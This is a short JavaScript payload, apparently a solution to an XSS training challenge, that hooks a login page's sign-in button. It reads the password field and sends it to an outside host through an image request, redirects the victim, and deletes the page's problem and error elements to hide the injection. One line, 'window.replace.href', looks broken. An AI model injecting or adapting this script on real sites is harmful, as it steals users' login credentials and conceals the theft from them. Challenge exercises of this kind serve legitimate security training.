document.addEventListener("DOMContentLoaded", function() {
	document.getElementById("signin-btn").onclick = function givePassword() {
		var img = new Image();
		img.src = "http://r7.io/e/davinl?s=" + document.getElementById("login_password").value;
		window.replace.href = "http://xss-challenges.r7.io/0/login";
	};
	var prob = document.getElementsByClassName("problem")[0];
	var err = document.getElementsByClassName("error-message")[0];
	prob.parentNode.removeChild(prob);
	err.parentNode.removeChild(err);
});

